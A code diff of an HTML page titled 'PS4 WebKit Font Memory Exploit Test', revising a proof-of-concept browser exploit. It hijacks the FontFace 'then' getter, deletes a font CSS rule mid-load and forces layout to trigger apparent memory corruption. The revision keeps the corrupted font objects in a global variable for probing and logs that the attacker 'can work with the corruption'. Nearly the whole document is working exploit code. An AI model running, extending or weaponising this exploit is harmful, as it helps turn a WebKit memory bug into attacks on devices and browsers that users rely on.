@@ -1,149 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit Font Memory Exploit Test</title>
-<style>
-body {
-    background: #000;
-    color: #0f0;
-    font-family: monospace;
-    padding: 20px;
-}
-#log {
-    border: 2px solid #0f0;
-    padding: 10px;
-    height: 400px;
-    overflow-y: auto;
-    background: #001100;
-}
-.error { color: #ff0000; }
-.success { color: #00ff00; }
-.info { color: #00ffff; }
-</style>
 <style id="s">
-@font-face { 
-    font-family: x; 
-    src: url(nonexistent-font.woff); 
-    unicode-range: U+0042; 
-}
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
 </style>
 </head>
 <body>
-
-<h1>🎮 PS4 WebKit Font Memory Exploit</h1>
-<div id="log"></div>
-
+<div id="status" style="font-size: 20px; padding: 20px;"></div>
 <script>
-
-const log = (msg, type = 'info') => {
-    const div = document.getElementById('log');
-    const entry = document.createElement('div');
-    entry.className = type;
-    entry.textContent = `[${new Date().toISOString().substr(11, 12)}] ${msg}`;
-    div.appendChild(entry);
-    div.scrollTop = div.scrollHeight;
+let statusDiv = document.getElementById('status');
+function log(msg) {
+    statusDiv.innerHTML += msg + '<br>';
     console.log(msg);
+}
+
+// Store corrupted objects globally so we can inspect after error
+window.exploitState = {
+    fonts: [],
+    corrupted: false,
+    error: null
 };
 
-log('PS4 WebKit Font Memory Exploit Test', 'success');
-log('Testing memory exhaustion bug...', 'info');
-
-window.onerror = (msg, url, line, col, error) => {
-    log(`ERROR: ${msg} at ${line}:${col}`, 'error');
-    return true;
+window.onerror = function(msg) {
+    log('ERROR CAUGHT: ' + msg);
+    window.exploitState.error = msg;
+    return true; // Prevent default error handling
 };
 
 window.onload = () => {
-    log('Page loaded, starting exploit...', 'info');
+    log('[+] Starting exploit...');
     
-    try {
-        // Create initial FontFace
-        log('Creating FontFace A with unicode U+0041...', 'info');
-        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-        document.fonts.add(A);
-        void A.loaded;
-        log('FontFace A created', 'success');
-        
-        let fired = false;
-        let triggerCount = 0;
-        
-        // Hijack FontFace.prototype.then
-        log('Hijacking FontFace.prototype.then getter...', 'info');
-        Object.defineProperty(FontFace.prototype, 'then', {
-            configurable: true,
-            get() {
-                log(`then getter triggered! (count: ${++triggerCount})`, 'info');
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    
+    window.exploitState.fonts.push(A);
+    
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired && this === A) {
+                fired = true;
+                log('[+] Getter triggered - creating corruption...');
                 
-                if (!fired && this === A) {
-                    fired = true;
-                    log('First trigger - creating Y and Z fonts...', 'info');
-                    
-                    try {
-                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                        log('Created FontFace Y', 'success');
-                    } catch (e) {
-                        log(`Error creating Y: ${e.message}`, 'error');
-                    }
-                    
-                    try {
-                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                        log('Created FontFace Z', 'success');
-                    } catch (e) {
-                        log(`Error creating Z: ${e.message}`, 'error');
-                    }
-                    
-                    try {
-                        log('Deleting CSS font rule...', 'info');
-                        document.getElementById('s').sheet.deleteRule(0);
-                        log('CSS rule deleted', 'success');
-                    } catch (e) {
-                        log(`Error deleting rule: ${e.message}`, 'error');
-                    }
-                    
-                    try {
-                        log('Forcing layout with offsetTop...', 'info');
-                        document.body.offsetTop;
-                        log('Layout forced', 'success');
-                    } catch (e) {
-                        log(`Error forcing layout: ${e.message}`, 'error');
-                    }
-                }
-                return undefined;
+                // Create corruption
+                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                
+                window.exploitState.fonts.push(y, z);
+                
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+                
+                window.exploitState.corrupted = true;
+                log('[+] Corruption triggered!');
             }
-        });
-        log('then getter hijacked successfully', 'success');
+            return undefined;
+        }
+    });
+    
+    log('[+] Calling fonts.load...');
+    document.fonts.load('1em x', 'AB');
+    
+    // After error appears, this should still run
+    setTimeout(() => {
+        log('[*] Timeout reached');
+        log('[*] Corrupted: ' + window.exploitState.corrupted);
+        log('[*] Font count: ' + window.exploitState.fonts.length);
+        log('[*] document.fonts.size: ' + document.fonts.size);
         
-        // Trigger the exploit
-        log('Calling document.fonts.load() to trigger exploit...', 'info');
-        document.fonts.load('1em x', 'AB');
-        log('fonts.load() called', 'success');
+        // Try to probe the corrupted fonts
+        try {
+            window.exploitState.fonts.forEach((f, i) => {
+                log('[*] Font ' + i + ': family=' + f.family + ', status=' + f.status);
+            });
+        } catch(e) {
+            log('[!] Exception probing fonts: ' + e);
+        }
         
-        setTimeout(() => {
-            log('Exploit sequence complete!', 'success');
-            log('Checking memory state...', 'info');
-            
-            // Try to allocate more memory to see if we corrupted anything
-            try {
-                const bigArray = new Array(1000000);
-                log('Memory allocation test passed', 'success');
-            } catch (e) {
-                log(`Memory allocation FAILED: ${e.message}`, 'error');
-                log('🔥 MEMORY CORRUPTION DETECTED! 🔥', 'error');
-            }
-            
-            log('', 'info');
-            log('TEST COMPLETE', 'success');
-            log('Did PS4 show "Not enough system memory"?', 'info');
-        }, 100);
+        log('[+] If you see this, we can work with the corruption!');
+        log('[+] Now try: javascript:alert(window.exploitState)');
         
-    } catch (e) {
-        log(`EXCEPTION: ${e.message}`, 'error');
-        log(`Stack: ${e.stack}`, 'error');
-    }
+    }, 2000);
 };
-
 </script>
-
 </body>
 </html>
